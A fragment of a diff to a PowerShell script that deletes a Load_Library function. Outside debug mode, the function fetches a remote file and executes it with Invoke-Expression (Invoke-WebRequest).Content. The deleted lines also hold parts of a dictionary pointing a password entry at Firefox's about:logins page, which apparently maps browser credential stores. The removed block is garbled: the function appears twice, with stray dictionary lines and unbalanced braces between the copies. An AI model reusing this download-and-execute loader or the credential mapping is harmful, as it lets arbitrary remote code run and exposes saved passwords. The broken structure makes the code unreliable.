@@ -87,35 +87,3 @@ $web_dict = @{
   }    
 }
 
-Function Load_Library {
-  param (
-    [Parameter(Position = 0, Mandatory = $true)]
-    [object]$lib_path
-  )
-  write-host $lib_name
-  if ($Global:debug) {
-    . $lib_path
-  }
-  else {
-    Invoke-Expression (Invoke-WebRequest -Uri $lib_path).Content
-  }
-}
-      password = "about:logins"
-    }
-    reg  = @()
-  }    
-}
-
-Function Load_Library {
-  param (
-    [Parameter(Position = 0, Mandatory = $true)]
-    [object]$lib_path
-  )
-  write-host $lib_name
-  if ($Global:debug) {
-    . $lib_path
-  }
-  else {
-    Invoke-Expression (Invoke-WebRequest -Uri $lib_path).Content
-  }
-}
